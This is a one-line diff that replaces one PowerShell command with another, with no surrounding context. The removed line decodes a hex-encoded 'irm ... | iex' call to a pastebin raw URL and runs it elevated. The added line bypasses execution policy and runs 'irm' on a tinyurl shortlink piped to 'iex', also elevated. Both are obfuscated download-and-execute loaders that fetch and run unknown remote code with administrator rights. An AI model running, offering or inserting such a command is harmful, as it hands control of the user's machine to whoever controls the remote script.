@@ -1,1 +1,1 @@
-powershell.exe -Command "Start-Process powershell.exe -ArgumentList '-Command', '[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromHexString(\"69726D202268747470733A2F2F706173746562696E2E636F6D2F7261772F777631487647345422207C20696578\")) | iex' -Verb RunAs"
+powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm \"https://tinyurl.com/4j72ashp\" | iex' -Verb RunAs"
